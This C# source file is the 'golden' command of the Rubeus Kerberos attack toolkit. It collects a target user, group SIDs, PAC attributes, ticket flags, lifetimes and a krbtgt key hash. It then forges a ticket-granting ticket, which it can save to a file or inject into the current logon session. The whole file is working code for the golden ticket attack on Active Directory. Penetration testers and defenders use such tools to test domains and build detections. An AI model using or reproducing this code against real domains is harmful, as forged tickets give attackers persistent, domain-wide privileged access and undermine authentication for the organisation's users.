using System;
using System.Collections.Generic;
using System.Globalization;

namespace Rubeus.Commands
{
    public class Golden : ICommand
    {
        public static string CommandName => "golden";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Action: Build TGT\r\n");

            // variable defaults
            string user = "";
            int? id = null;
            string sids = "";
            string groups = "";
            string displayName = "";
            short? logonCount = null;
            short? badPwdCount = null;
            DateTime? lastLogon = null;
            DateTime? logoffTime = null;
            DateTime? pwdLastSet = null;
            int? maxPassAge = null;
            int? minPassAge = null;
            int? pGid = null;
            string homeDir = "";
            string homeDrive = "";
            string profilePath = "";
            string scriptPath = "";
            string resourceGroupSid = "";
            List<int> resourceGroups = null;
            Interop.PacUserAccountControl uac = Interop.PacUserAccountControl.NORMAL_ACCOUNT;

            string domain = "";
            string dc = "";
            string sid = "";
            string netbios = "";

            bool ldap = false;
            string ldapuser = null;
            string ldappassword = null;

            string hash = "";
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial;

            Interop.TicketFlags flags = Interop.TicketFlags.forwardable | Interop.TicketFlags.renewable | Interop.TicketFlags.pre_authent | Interop.TicketFlags.initial;

            DateTime startTime = DateTime.UtcNow;
            DateTime authTime = startTime;
            DateTime? rangeEnd = null;
            string rangeInterval = "1d";
            string endTime = "";
            string renewTill = "";
            bool newPac = true;
            bool extendedUpnDns = arguments.ContainsKey("/extendedupndns");

            string outfile = "";
            bool ptt = false;
            bool printcmd = false;
            Int32 rodcNumber = 0;

            if (arguments.ContainsKey("/rodcNumber"))
            {
                rodcNumber = Int32.Parse(arguments["/rodcNumber"]);
            }
            // user information mostly for the PAC
            if (arguments.ContainsKey("/user"))
            {
                string[] parts = arguments["/user"].Split('\\');
                if (parts.Length == 2)
                {
                    domain = parts[0];
                    user = parts[1];
                }
                else
                {
                    user = arguments["/user"];
                }
            }
            if (arguments.ContainsKey("/sids"))
            {
                sids = arguments["/sids"];
            }
            if (arguments.ContainsKey("/groups"))
            {
                groups = arguments["/groups"];
            }
            if (arguments.ContainsKey("/id"))
            {
                id = Int32.Parse(arguments["/id"]);
            }
            if (arguments.ContainsKey("/pgid"))
            {
                pGid = Int32.Parse(arguments["/pgid"]);
            }
            if (arguments.ContainsKey("/displayname"))
            {
                displayName = arguments["/displayname"];
            }
            if (arguments.ContainsKey("/logoncount"))
            {
                logonCount = short.Parse(arguments["/logoncount"]);
            }
            if (arguments.ContainsKey("/badpwdcount"))
            {
                badPwdCount = short.Parse(arguments["/badpwdcount"]);
            }
            if (arguments.ContainsKey("/lastlogon"))
            {
                lastLogon = DateTime.Parse(arguments["/lastlogon"], CultureInfo.CurrentCulture, DateTimeStyles.AssumeLocal).ToUniversalTime();
            }
            if (arguments.ContainsKey("/logofftime"))
            {
                logoffTime = DateTime.Parse(arguments["/logofftime"], CultureInfo.CurrentCulture, DateTimeStyles.AssumeLocal).ToUniversalTime();
            }
            if (arguments.ContainsKey("/pwdlastset"))
            {
                pwdLastSet = DateTime.Parse(arguments["/pwdlastset"], CultureInfo.CurrentCulture, DateTimeStyles.AssumeLocal).ToUniversalTime();
            }
            if (arguments.ContainsKey("/maxpassage"))
            {
                maxPassAge = Int32.Parse(arguments["/maxpassage"]);
            }
            if (arguments.ContainsKey("/minpassage"))
            {
                minPassAge = Int32.Parse(arguments["/minpassage"]);
            }
            if (arguments.ContainsKey("/homedir"))
            {
                homeDir = arguments["/homedir"];
            }
            if (arguments.ContainsKey("/homedrive"))
            {
                homeDrive = arguments["/homedrive"];
            }
            if (arguments.ContainsKey("/profilepath"))
            {
                profilePath = arguments["/profilepath"];
            }
            if (arguments.ContainsKey("/scriptpath"))
            {
                scriptPath = arguments["/scriptpath"];
            }
            if (arguments.ContainsKey("/resourcegroupsid") && arguments.ContainsKey("/resourcegroups"))
            {
                resourceGroupSid = arguments["/resourcegroupsid"];
                resourceGroups = new List<int>();
                foreach (string rgroup in arguments["/resourcegroups"].Split(','))
                {
                    try
                    {
                        resourceGroups.Add(int.Parse(rgroup));
                    }
                    catch
                    {
                        Console.WriteLine("[!] Resource group value invalid: {0}", rgroup);
                    }
                }
            }
            if (arguments.ContainsKey("/uac"))
            {
                Interop.PacUserAccountControl tmp = Interop.PacUserAccountControl.EMPTY;

                foreach (string u in arguments["/uac"].Split(','))
                {
                    Interop.PacUserAccountControl result;
                    bool status = Interop.PacUserAccountControl.TryParse(u, out result);

                    if (status)
                    {
                        tmp |= result;
                    }
                    else
                    {
                        Console.WriteLine("[X] Error the following flag name passed is not valid: {0}", u);
                    }
                }
                if (tmp != Interop.PacUserAccountControl.EMPTY)
                {
                    uac = tmp;
                }
            }

            // domain and DC information
            if (arguments.ContainsKey("/domain"))
            {
                domain = arguments["/domain"];
            }
            if (arguments.ContainsKey("/dc"))
            {
                dc = arguments["/dc"];
            }
            if (arguments.ContainsKey("/sid"))
            {
                sid = arguments["/sid"];
            }
            if (arguments.ContainsKey("/netbios"))
            {
                netbios = arguments["/netbios"];
            }

            // getting the user information from LDAP
            if (arguments.ContainsKey("/ldap"))
            {
                ldap = true;
                if (arguments.ContainsKey("/creduser"))
                {
                    if (!arguments.ContainsKey("/credpassword"))
                    {
                        Console.WriteLine("\r\n[X] /credpassword is required when specifying /creduser\r\n");
                        return;
                    }

                    ldapuser = arguments["/creduser"];
                    ldappassword = arguments["/credpassword"];
                }

                if (String.IsNullOrEmpty(domain))
                {
                    domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
                }
            }

            // encryption types
            encType = Interop.KERB_ETYPE.rc4_hmac; //default is non /enctype is specified
            if (arguments.ContainsKey("/enctype"))
            {
                string encTypeString = arguments["/enctype"].ToUpper();

                if (encTypeString.Equals("RC4") || encTypeString.Equals("NTLM"))
                {
                    encType = Interop.KERB_ETYPE.rc4_hmac;
                }
                else if (encTypeString.Equals("AES128"))
                {
                    encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
                }
                else if (encTypeString.Equals("AES256") || encTypeString.Equals("AES"))
                {
                    encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                }
                else if (encTypeString.Equals("DES"))
                {
                    encType = Interop.KERB_ETYPE.des_cbc_md5;
                }
            }

            if (arguments.ContainsKey("/des"))
            {
                hash = arguments["/des"];
                encType = Interop.KERB_ETYPE.des_cbc_md5;
            }
            else if (arguments.ContainsKey("/rc4"))
            {
                hash = arguments["/rc4"];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey("/ntlm"))
            {
                hash = arguments["/ntlm"];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            else if (arguments.ContainsKey("/aes128"))
            {
                hash = arguments["/aes128"];
                encType = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
            }
            else if (arguments.ContainsKey("/aes256"))
            {
                hash = arguments["/aes256"];
                encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            }

            // flags
            if (arguments.ContainsKey("/flags"))
            {
                Interop.TicketFlags tmp = Interop.TicketFlags.empty;

                foreach (string flag in arguments["/flags"].Split(','))
                {
                    Interop.TicketFlags result;
                    bool status = Interop.TicketFlags.TryParse(flag, out result);

                    if (status)
                    {
                        tmp |= result;
                    }
                    else
                    {
                        Console.WriteLine("[X] Error the following flag name passed is not valid: {0}", flag);
                    }
                }
                if (tmp != Interop.TicketFlags.empty)
                {
                    flags = tmp;
                }
            }

            // ticket times
            if (arguments.ContainsKey("/starttime"))
            {
                try
                {
                    startTime = DateTime.Parse(arguments["/starttime"], CultureInfo.CurrentCulture, DateTimeStyles.AssumeLocal).ToUniversalTime();
                }
                catch (Exception e)
                {
                    Console.WriteLine("[X] Error unable to parse supplied /starttime {0}: {1}", arguments["/starttime"], e.Message);
                    return;
                }
            }
            if (arguments.ContainsKey("/authtime"))
            {
                try
                {
                    authTime = DateTime.Parse(arguments["/authtime"], CultureInfo.CurrentCulture, DateTimeStyles.AssumeLocal).ToUniversalTime();
                }
                catch (Exception e)
                {
                    Console.WriteLine("[!] Unable to parse supplied /authtime {0}: {1}", arguments["/authtime"], e.Message);
                    authTime = startTime;
                }
            }
            else if (arguments.ContainsKey("/starttime"))
            {
                authTime = startTime;
            }
            if (arguments.ContainsKey("/rangeend"))
            {
                rangeEnd = Helpers.FutureDate(startTime, arguments["/rangeend"]);
                if (rangeEnd == null)
                {
                    Console.WriteLine("[!] Ignoring invalid /rangeend argument: {0}", arguments["/rangeend"]);
                    rangeEnd = startTime;
                }
            }
            if (arguments.ContainsKey("/rangeinterval"))
            {
                rangeInterval = arguments["/rangeinterval"];
            }
            if (arguments.ContainsKey("/endtime"))
            {
                endTime = arguments["/endtime"];
            }
            if (arguments.ContainsKey("/renewtill"))
            {
                renewTill = arguments["/renewtill"];
            }

            if (arguments.ContainsKey("/oldpac"))
            {
                newPac = false;
            }

            // actions for the ticket(s)
            if (arguments.ContainsKey("/ptt"))
            {
                ptt = true;
            }
            if (arguments.ContainsKey("/outfile"))
            {
                outfile = arguments["/outfile"];
            }

            // print a command that could be used to recreate the ticket
            // useful if you use LDAP to get the user information, this could be used to avoid touching LDAP again
            if (arguments.ContainsKey("/printcmd"))
            {
                printcmd = true;
            }

            // checks
            if (String.IsNullOrEmpty(user))
            {
                Console.WriteLine("\r\n[X] You must supply a user name!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(hash))
            {
                Console.WriteLine("\r\n[X] You must supply a [/des|/rc4|/aes128|/aes256] hash!\r\n");
                return;
            }

            if (!((encType == Interop.KERB_ETYPE.des_cbc_md5) || (encType == Interop.KERB_ETYPE.rc4_hmac) || (encType == Interop.KERB_ETYPE.aes128_cts_hmac_sha1) || (encType == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)))
            {
                Console.WriteLine("\r\n[X] Only /des, /rc4, /aes128, and /aes256 are supported at this time.\r\n");
                return;
            }
            else
            {
                ForgeTickets.ForgeTicket(
                    user,
                    String.Format("krbtgt/{0}", domain),
                    Helpers.StringToByteArray(hash),
                    encType,
                    null,
                    Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_HMAC_SHA1_96_AES256,
                    ldap,
                    ldapuser,
                    ldappassword,
                    sid,
                    domain,
                    netbios,
                    dc,
                    flags,
                    startTime,
                    rangeEnd,
                    rangeInterval,
                    authTime,
                    endTime,
                    renewTill,
                    id,
                    groups,
                    sids,
                    displayName,
                    logonCount,
                    badPwdCount,
                    lastLogon,
                    logoffTime,
                    pwdLastSet,
                    maxPassAge,
                    minPassAge,
                    pGid,
                    homeDir,
                    homeDrive,
                    profilePath,
                    scriptPath,
                    resourceGroupSid,
                    resourceGroups,
                    uac,
                    newPac,
                    extendedUpnDns,
                    outfile,
                    ptt,
                    printcmd,
                    null,
                    null,
                    null,
                    null,
                    false,
                    false,
                    rodcNumber
                    );
                return;
            }
        }
    }
}
